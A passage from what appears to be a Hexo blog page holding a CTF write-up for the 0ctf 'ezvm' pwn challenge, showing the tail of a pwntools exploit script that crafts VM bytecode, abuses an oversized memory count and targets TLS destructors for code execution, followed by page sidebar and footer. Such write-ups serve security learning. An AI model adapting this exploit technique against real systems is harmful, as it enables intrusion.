class="number">0x181000</span>/<span class="number">8</span>)</span><br><span class="line">code += <span class="string">&#x27;\x15\x02&#x27;</span>+p64(<span class="number">0x181008</span>/<span class="number">8</span>)</span><br><span class="line">offset = (fsbase+<span class="number">0x30</span>-vmmap)/<span class="number">8</span></span><br><span class="line">code += <span class="string">&#x27;\x15\x00&#x27;</span>+p64(offset)</span><br><span class="line">code += <span class="string">&#x27;\x17&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b __call_tls_dtors&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0x23C9)&#x27;)</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;code size:\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(code))) <span class="comment">#code</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;memory count:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x2000000000030000</span>)) <span class="comment">#count =&gt; Data = 8*0x100</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Please input your code:&quot;</span>,code)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;continue?\n&quot;</span>,<span class="string">&#x27;bye bye\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/0ctf/" rel="tag"># 0ctf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/08/29/VMpwn/" rel="prev" title="VMpwn">
+      <i class="fa fa-chevron-left"></i> VMpwn
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezvm"><span class="nav-number">1.</span> <span class="nav-text">ezvm</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.1.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="nav-number">1.2.</span> <span class="nav-text">题目</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%B3%84%E6%BC%8Flibc"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.泄漏libc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E4%BB%BB%E6%84%8Flibc%E5%9C%B0%E5%9D%80%E5%86%99"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.任意libc地址写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E6%8C%87%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">1.2.3.</span> <span class="nav-text">3.指令执行</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">44</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
